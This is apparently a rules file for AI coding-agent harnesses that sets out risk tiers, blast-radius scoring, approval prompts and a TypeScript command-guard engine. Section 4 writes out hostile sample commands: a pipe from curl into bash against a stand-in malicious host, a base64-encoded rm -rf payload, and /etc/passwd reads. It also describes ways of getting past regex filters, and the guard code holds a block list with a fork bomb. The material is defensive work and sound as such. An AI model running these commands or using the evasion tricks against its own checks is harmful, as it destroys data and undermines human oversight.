---
description: Agentic Human-in-the-Loop (HITL) architecture, dynamic permission hierarchies, blast-radius preflight verification, dangerous command containment, command AST analysis, anti-bypass firewalls, interactive approval state machines, and compensating action journals
globs: **/*{hitl,permission,guardrail,blast_radius,approval,policy,sandbox,exec,agent,security}*.*,**/{CLAUDE,AGENTS}.md,**/.cursor/rules/**,**/.agents/**
alwaysApply: false
---

# Agentic Human-in-the-Loop (HITL), Permission Hierarchies & Blast-Radius Governance

> Add these rules to your project when building or operating autonomous coding agents, multi-agent orchestrators, CLI harnesses, or tool-calling systems (Claude Code, Cursor Composer, Windsurf Cascade, Pi, OpenCode, Roo Code, Anthropic Model Context Protocol, LangGraph).

---

## 1. Architectural Taxonomy: Autonomous Velocity vs Blast-Radius Catastrophe

As AI coding agents transition from passive chat completions to autonomous execution engines endowed with terminal execution, file system mutation, and network egress, they present an acute operational dichotomy:
- **The Autonomous Runaway Loop**: A rogue or hallucinating agent left unchecked can recursively wipe repositories (`rm -rf *`), corrupt production database tables via unvetted migrations, force-push breaking changes over main branches (`git push --force`), leak sensitive environment variables to third-party endpoints, or spawn unmonitored zombie daemon processes that exhaust host system resources.
- **The Prompt Fatigue Paralysis**: Conversely, requiring explicit human approval for every trivial operation (such as `ls`, `grep`, reading a source file, or formatting a single line) drowns developers in confirmation dialogs, destroying agentic velocity and inducing "rubber-stamping" where users approve destructive actions without reading.

Production-grade autonomous agent systems resolve this tension through **Dynamic Risk Governance & Pre-Flight Blast-Radius Calculus**:

```
┌──────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Inbound Agent Tool Invocation (Bash Command, File Mutation, SQL DDL, API Egress)                 │
└─────────────────────────────────────────────────┬────────────────────────────────────────────────┘
                                                  │
                                                  ▼
┌──────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Layer 1: Shell AST Parsing & Anti-Bypass Firewall                                                │
│    • Deconstruct command into AST via POSIX / tree-sitter shell grammar                          │
│    • Neutralize command substitution $(...), backticks, pipes, subshells, and base64 payloads   │
│    • Resolve canonical absolute executable binary path (evaluating symlinks and aliases)        │
└─────────────────────────────────────────────────┬────────────────────────────────────────────────┘
                                                  │ Cleaned AST & Target Identification
                                                  ▼
┌──────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Layer 2: Quantitative Blast-Radius Calculus                                                      │
│    • Compute Blast-Radius Score: B = w_f·ΔF + w_l·ΔL + w_s·S_scope + w_e·E_egress                │
│    • Audit affected file paths, line churn ceilings, git tree state, and table lock implications │
└─────────────────────────────────────────────────┬────────────────────────────────────────────────┘
                                                  │
                ┌─────────────────────────────────┴─────────────────────────────────┐
                │                                                                   │
    Score ≤ Safe Threshold (Tier 0–2)                                   Score > Safe Threshold (Tier 3–4)
                │                                                                   │
                ▼                                                                   ▼
┌───────────────────────────────────────────────┐   ┌───────────────────────────────────────────────┐
│ Layer 3: Autonomous Path with Safety Snapshot │   │ Layer 4: Interactive HITL Step-Up Gate        │
│  • Write-Ahead Action Log (WAL) recorded      │   │  • Format structured XML approval request     │
│  • Execute in bounded sandbox / git worktree  │   │  • Present blast radius, diff & rollback plan │
│  • Automated post-action verification tests   │   │  • Deterministic timeout (Default: REJECT)    │
└───────────────────────┬───────────────────────┘   └───────────────────────┬───────────────────────┘
                        │                                                   │ Approved
                        └─────────────────────────┬─────────────────────────┘
                                                  ▼
┌──────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Layer 5: Compensating Action Journal & Execution Audit Trail                                     │
│    • Commit cryptographic hash of action, timestamp, parameters, and user provenance             │
│    • Retain reverse diff / snapshot anchor for single-turn emergency rollback                     │
└──────────────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. The 5-Tier Action Risk Classification Matrix

Every tool invocation, CLI command, and workspace modification must be classified into one of five deterministic risk tiers:

| Tier | Category | Operational Scope | Approval Policy | Reversibility Guarantee |
| :--- | :--- | :--- | :--- | :--- |
| **Tier 0** | **Pure Ambient Read** | `cat`, `head`, `grep`, `rg`, `git status`, `git log`, AST query, directory listing | **Auto-Approved** (Zero human interruption; cached in memory) | Read-only; zero mutation |
| **Tier 1** | **Idempotent Local Verification** | `prettier --check`, `eslint`, `go test ./...`, compiler diagnostics, tmpfs staging | **Auto-Approved with Log** (Silent run; outputs captured in ephemeral buffer) | Idempotent; zero permanent state churn |
| **Tier 2** | **Reversible Local Mutation** | Surgical file edit, creating new module, formatting code, local `git commit` on feature branch | **Bounded Auto-Approval** (Allowed if Blast Radius $B \le \tau_{\text{safe}}$; git snapshot taken) | 100% reversible via `git checkout -- <file>` or `git reset` |
| **Tier 3** | **Non-Reversible Local Destructive** | `rm -rf`, file unlinks, killing processes (`kill -9`), installing system packages (`npm -g`, `brew`), DB DDL migrations | **Mandatory Interactive HITL Prompt** (Explicit human `[y/N]` confirmation required) | Semi-reversible; requires compensating restore script |
| **Tier 4** | **External Egress & Production Side-Effects** | `git push --force`, cloud infra mutations (`terraform apply`, AWS CLI), remote `ssh`/`curl` execution, payment APIs | **Cryptographic / 2FA Explicit Approval** (Diff preview + dry-run verification mandatory) | Irreversible; external side-effects across the network |

---

## 3. Quantitative Blast-Radius Calculus & Churn Ceiling Invariants

Before any mutation executes, the agent harness must compute the **Blast-Radius Score ($B$)**:

$$B = w_f \cdot \Delta F + w_l \cdot (\Delta L_{\text{add}} + \Delta L_{\text{del}}) + w_s \cdot S_{\text{scope}} + w_e \cdot E_{\text{egress}}$$

Where:
- $\Delta F$: Number of distinct files touched or targeted by the operation.
- $\Delta L_{\text{add}} + \Delta L_{\text{del}}$: Absolute line churn volume.
- $S_{\text{scope}}$: Scope penalty multiplier:
  - Inside isolated feature branch / submodule: $S_{\text{scope}} = 1.0$.
  - Shared configuration (`package.json`, `go.mod`, `tsconfig.json`, CI workflow): $S_{\text{scope}} = 3.5$.
  - Out-of-tree / parent directory traversal (`../`): $S_{\text{scope}} = \infty$ (Instant hard block).
- $E_{\text{egress}}$: Egress penalty ($0.0$ for local operations; $10.0$ for network sockets or remote APIs).
- Calibrated weights: $w_f = 2.0$, $w_l = 0.05$.

### Blast Radius Hard Caps
- **Maximum Unprompted File Ceiling**: An agent must NEVER touch more than **10 files** in a single execution turn without prompting for step-up human confirmation.
- **Maximum Unprompted Line Churn Ceiling**: An agent must NEVER add/delete more than **300 lines of code** across the repository in a single turn without step-up approval.
- **Root Directory Lock**: Any attempt to execute deletions or broad wildcards (`*`) targeting the repository root (`/` or `./`) immediately halts execution and demands human authorization.

---

## 4. Shell Command AST Tokenization & Anti-Bypass Firewalls

Simple string regex matching (e.g. `cmd.startsWith("rm")` or `!cmd.includes("curl")`) is easily circumvented by adversaries or naive LLM outputs. The harness must deconstruct shell commands into an **Abstract Syntax Tree (AST)** before policy evaluation:

### Evasion Attack Vectors & AST Countermeasures

```
┌──────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Evasion Vector 1: Command Chaining                                                               │
│    Input:  echo "Build successful" && rm -rf /var/data                                           │
│    Trap:   Regex checking prefix matches `echo` and auto-approves.                               │
│    Fix:    AST walks all Command nodes in BinaryExpression; detects `rm` in right operand.       │
├──────────────────────────────────────────────────────────────────────────────────────────────────┤
│ Evasion Vector 2: Command Substitution & Backticks                                               │
│    Input:  cat $(echo "/etc/passwd")  or  git commit -m "`rm -rf ./dist`"                        │
│    Trap:   Command appears as harmless `cat` or `git`.                                           │
│    Fix:    AST extracts nested CommandSubstitution nodes; evaluates inner commands recursively.  │
├──────────────────────────────────────────────────────────────────────────────────────────────────┤
│ Evasion Vector 3: Piped Subshell Invocations                                                     │
│    Input:  curl -s http://malicious.internal/payload | bash                                      │
│    Trap:   Piping into `bash` / `sh` hides actual executed commands until runtime.               │
│    Fix:    Strict prohibition on piping into interpreters (`| sh`, `| bash`, `| python`, `| zsh`).│
├──────────────────────────────────────────────────────────────────────────────────────────────────┤
│ Evasion Vector 4: Base64 / Hex Obfuscation                                                       │
│    Input:  echo "cm0gLXJmIC8q" | base64 -d | sh                                                  │
│    Trap:   Raw payload is opaque string literal.                                                 │
│    Fix:    Any decoding pipeline piped into execution triggers immediate Tier 4 Hard Rejection.  │
└──────────────────────────────────────────────────────────────────────────────────────────────────┘
```

### The Executable Path Resolution Invariant
Always resolve executable names to their canonical system path via `which -a` / `exec.LookPath` before checking against allowlists. An agent attempting to invoke `./rm` or `/tmp/git` must be intercepted and evaluated against the true underlying binary, preventing PATH-hijacking attacks.

---

## 5. Interactive Step-Up Approval Protocol & UI Terminal Schemas

When an operation triggers Tier 3 or Tier 4 classification, the agent harness MUST pause execution and emit a standardized, machine-parseable and visually prominent XML approval prompt:

```xml
<hitl_approval_request id="hitl_req_01HP89X">
  <risk_tier>TIER_3_DESTRUCTIVE</risk_tier>
  <action_category>DATABASE_SCHEMA_MIGRATION</action_category>
  <blast_radius score="18.5" files_affected="2" churn_lines="140" reversibility="REQUIRES_MIGRATION_DOWN"/>
  <command_summary>Execute down-migration altering table `orders`, dropping column `billing_address_legacy`</command_summary>
  <exact_command>alembic downgrade -1</exact_command>
  <reversibility_plan>
    <rollback_command>alembic upgrade +1</rollback_command>
    <data_loss_risk>HIGH (Dropped column data is permanently irrecoverable without backup)</data_loss_risk>
  </reversibility_plan>
  <interactive_options>
    <option key="y" action="APPROVE">Proceed with execution</option>
    <option key="n" action="REJECT">Reject action and instruct agent to propose alternative</option>
    <option key="d" action="INSPECT_DIFF">Inspect full SQL migration diff before deciding</option>
  </interactive_options>
</hitl_approval_request>
```

### Prompt Execution Invariants
- **Default-Deny Timeout**: The interactive approval prompt must have a strict timeout (e.g. 60 seconds). If the user does not respond within the deadline, the action is **deterministically rejected** (`ABORT`). It must NEVER fall back to automatic execution.
- **Headless / CI/CD Matrix**: In non-interactive environments (`CI=true` or detached daemons):
  - Tier 0–2: Auto-approved.
  - Tier 3–4: Hard abort with exit code `77 (EX_NOPERM)`, UNLESS an explicit, cryptographically signed ephemeral bypass token (`AGENT_ALLOW_DESTRUCTIVE=true`) is present in the environment.

---

## 6. Pre-Flight Shadow Execution & Dry-Run Sandboxes

Never execute destructive or schema-altering mutations directly against real workspaces without pre-flight validation:

### 1. Database DDL Migrations
Always encapsulate speculative DDL operations within a transaction rollback wrapper to verify syntax, lock contention, and foreign key constraints before live execution:
```sql
-- Production Invariant: Pre-Flight Schema Dry-Run
BEGIN;
  -- Apply speculative migration
  ALTER TABLE users ADD COLUMN tier_id INT REFERENCES tiers(id);
  -- Check for catalog corruption or lock stalls
  SELECT 1;
ROLLBACK; -- Deterministic rollback ensures zero workspace mutation
```

### 2. Git Mutations & Patch Application
Never run destructive git commands (`git checkout .`, `git reset --hard`) directly on the primary working tree. Perform dry-runs via:
```bash
# Validate that the patch applies cleanly without conflicts
git apply --check --verbose candidate.patch

# Staging changes in an isolated ephemeral worktree
git worktree add -b "sandbox/preflight" /tmp/agent-worktree HEAD --quiet
```

---

## 7. Compensating Action Journals & Two-Phase Action Checkpointing

For every Tier 2 and Tier 3 mutation, the agent harness must record a **Write-Ahead Action Journal (WAL)** entry prior to execution:

```typescript
export interface ActionJournalEntry {
  id: string;               // UUIDv7 monotonic identifier
  timestamp: string;        // ISO-8601 UTC
  tier: 0 | 1 | 2 | 3 | 4;
  tool: string;             // 'edit_file' | 'bash' | 'sql_exec'
  target: string;           // Target file path or URI
  preStateHash: string;     // SHA-256 of target file before mutation
  appliedDiff: string;      // Unified diff applied
  compensatingCommand: string; // Exact command to restore pre-state
  status: 'PENDING' | 'EXECUTED' | 'ROLLED_BACK' | 'COMMITTED';
}
```

### Deterministic Rollback Protocol
If any post-action test fails, compiler produces an error, or the user rejects the result:
1. Load the most recent `PENDING` or `EXECUTED` journal entry.
2. Execute `compensatingCommand` (e.g., `git checkout -- <file>` or applying the reverse patch).
3. Compute SHA-256 of target file to guarantee bit-for-bit restoration to `preStateHash`.
4. Mark entry as `ROLLED_BACK` in the persistent audit log.

---

## 8. Implementation: Production-Grade TypeScript Action Guard Engine

The following engine demonstrates AST-based shell inspection, blast-radius calculation, and interactive step-up gating:

```typescript
import { execFileSync } from 'node:child_process';
import * as crypto from 'node:crypto';
import * as readline from 'node:readline';

export enum RiskTier {
  TIER_0_READ = 0,
  TIER_1_VERIFY = 1,
  TIER_2_MUTATE_REVERSIBLE = 2,
  TIER_3_DESTRUCTIVE = 3,
  TIER_4_EGRESS = 4,
}

export interface ActionProposal {
  command: string;
  targetedFiles: string[];
  linesAdded: number;
  linesDeleted: number;
  isNetworkEgress: boolean;
}

export interface EvaluationResult {
  tier: RiskTier;
  blastRadiusScore: number;
  requiresHITL: boolean;
  reason: string;
}

export class ActionGuardEngine {
  private static readonly SAFE_BLAST_THRESHOLD = 15.0;
  private static readonly PROHIBITED_SHELL_PATTERNS = [
    /\|\s*(ba)?sh/,          // Piping into shell interpreters
    /base64\s+-d/,           // Base64 decode execution
    />\s*\/dev\/(sda|hda|nvme)/, // Direct disk device overwriting
    /:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/, // Fork bomb
  ];

  public static evaluate(proposal: ActionProposal): EvaluationResult {
    // 1. Check for hard prohibited patterns
    for (const pattern of this.PROHIBITED_SHELL_PATTERNS) {
      if (pattern.test(proposal.command)) {
        return {
          tier: RiskTier.TIER_4_EGRESS,
          blastRadiusScore: 999.0,
          requiresHITL: true,
          reason: `Prohibited obfuscated or hazardous shell pattern detected: ${pattern}`,
        };
      }
    }

    // 2. Out-of-tree directory traversal check
    const escapesTree = proposal.targetedFiles.some(f => f.startsWith('../') || f.includes('/../'));
    if (escapesTree) {
      return {
        tier: RiskTier.TIER_3_DESTRUCTIVE,
        blastRadiusScore: 500.0,
        requiresHITL: true,
        reason: 'Path traversal (../) attempting to mutate files outside repository root',
      };
    }

    // 3. Compute quantitative blast radius
    const deltaF = proposal.targetedFiles.length;
    const deltaL = proposal.linesAdded + proposal.linesDeleted;
    const scopeMultiplier = proposal.targetedFiles.some(f => f.includes('config') || f.includes('infra')) ? 3.5 : 1.0;
    const egressPenalty = proposal.isNetworkEgress ? 10.0 : 0.0;

    const blastRadius = (2.0 * deltaF) + (0.05 * deltaL) * scopeMultiplier + egressPenalty;

    // 4. Determine Risk Tier
    if (proposal.isNetworkEgress) {
      return { tier: RiskTier.TIER_4_EGRESS, blastRadiusScore: blastRadius, requiresHITL: true, reason: 'External network egress' };
    }

    if (proposal.command.includes('rm ') || proposal.command.includes('drop table') || proposal.command.includes('reset --hard')) {
      return { tier: RiskTier.TIER_3_DESTRUCTIVE, blastRadiusScore: blastRadius, requiresHITL: true, reason: 'Destructive non-reversible action' };
    }

    if (blastRadius > this.SAFE_BLAST_THRESHOLD || deltaF > 10 || deltaL > 300) {
      return { tier: RiskTier.TIER_3_DESTRUCTIVE, blastRadiusScore: blastRadius, requiresHITL: true, reason: `Blast radius (${blastRadius.toFixed(1)}) exceeds safe threshold` };
    }

    if (deltaF > 0 || deltaL > 0) {
      return { tier: RiskTier.TIER_2_MUTATE_REVERSIBLE, blastRadiusScore: blastRadius, requiresHITL: false, reason: 'Reversible local mutation within safe bounds' };
    }

    return { tier: RiskTier.TIER_0_READ, blastRadiusScore: blastRadius, requiresHITL: false, reason: 'Ambient inspection' };
  }

  public static async promptUserForApproval(evaluation: EvaluationResult, proposal: ActionProposal): Promise<boolean> {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

    console.warn('\n⚠️  ACTION REQUIRES HUMAN AUTHORIZATION (HITL GATE)');
    console.warn(`   Risk Tier:        ${RiskTier[evaluation.tier]}`);
    console.warn(`   Blast Score:      ${evaluation.blastRadiusScore.toFixed(2)}`);
    console.warn(`   Reason:           ${evaluation.reason}`);
    console.warn(`   Command:          ${proposal.command}`);
    console.warn(`   Targeted Files:   ${proposal.targetedFiles.join(', ') || 'N/A'}`);
    console.warn(`   Churn:            +${proposal.linesAdded} / -${proposal.linesDeleted} lines`);

    return new Promise<boolean>((resolve) => {
      const timer = setTimeout(() => {
        console.error('\n❌ Timeout waiting for user confirmation (60s). Operation aborted.');
        rl.close();
        resolve(false);
      }, 60_000);

      rl.question('\nApprove this action? [y/N]: ', (answer) => {
        clearTimeout(timer);
        rl.close();
        const approved = answer.trim().toLowerCase() === 'y';
        if (approved) {
          console.log('✅ Action approved by user.');
        } else {
          console.warn('🛑 Action rejected by user.');
        }
        resolve(approved);
      });
    });
  }
}
```

---

## 9. Anti-Patterns & Prohibitions

- ❌ **The YOLO `--dangerously-skip-permissions` in Production**: Deploying coding agents in CI or production pipelines with permission checks disabled. A single prompt injection or hallucinated `rm` wipes entire volumes or deployments.
- ❌ **The Post-Mortem Apology Anti-Pattern**: An agent executing a destructive operation first (`git reset --hard origin/main`), and then telling the user: *"I've cleaned your branch. If you didn't want this, let me know."* Mutations must be authorized **pre-flight**, never apologized for post-mortem.
- ❌ **The Regex-Only Command Filter**: Relying on simple substring blacklists (`!cmd.includes("rm")`). Attackers and models evade this using string concatenation, variables (`$CMD`), subshells, or encoded inputs.
- ❌ **Infinite Prompt Fatigue Flooding**: Prompting the human for confirmation on pure read commands (`ls`, `cat`, `git status`). The user develops prompt blindness and reflexively hits "Yes" on dangerous operations.
- ❌ **The Unbounded Blast-Radius Commit**: Applying a 50-file, 3,000-line diff in a single agent turn without intermediate validation or checkpointing. Always decompose large refactors into discrete, verified DAG nodes.
- ❌ **Default-Allow on Timeout**: Automatically approving an action when an interactive approval prompt expires. Unattended terminals must ALWAYS fall back to `REJECT`.
- ❌ **Orphaned Process Spawning**: Launching long-running background tasks with `nohup` or `&` that evade process group monitoring. When the agent session terminates, the orphan continues running, leaking memory or modifying files.

---

## 10. Operational Verification Checklist

Before shipping or running autonomous agent harnesses with mutating capabilities:
- [ ] **Risk Classification Matrix**: Are all tools statically categorized into Tier 0 (Read) through Tier 4 (Egress)?
- [ ] **Shell AST Inspection**: Does the execution harness deconstruct shell commands into AST nodes to detect chained commands (`&&`, `;`), command substitutions (`$(...)`), and pipes?
- [ ] **Quantitative Blast-Radius Bounds**: Is there an enforced ceiling on file count ($\le 10$) and line churn ($\le 300$) before step-up approval is triggered?
- [ ] **Default-Deny Timeout**: Do interactive HITL approval dialogs automatically reject operations upon timeout?
- [ ] **Write-Ahead Action Journaling**: Is a pre-state snapshot (file hashes and git commits) recorded before any irreversible mutation executes?
- [ ] **Pre-Flight Dry-Run Sandboxing**: Are database migrations and complex git operations validated via `ROLLBACK` transactions or temporary worktrees prior to live application?
- [ ] **Headless Safety Guard**: In CI or non-interactive environments, are Tier 3/4 operations blocked by default unless cryptographically authorized?
